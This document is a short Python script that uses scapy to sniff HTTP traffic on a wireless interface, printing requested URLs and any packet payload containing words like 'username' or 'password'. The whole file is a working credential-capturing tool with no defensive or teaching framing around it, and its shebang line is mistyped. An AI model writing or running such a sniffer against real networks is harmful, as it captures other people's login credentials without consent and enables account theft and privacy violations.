#1/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = (packet[scapy.Raw].load)
        keywords = ["usr","username","user-name","login","user","pass","pwd","password"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request (url) >>:"+ url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >>"+ login_info +"\n\n")

if __name__ == "__main__":
    sniff("wlan0")
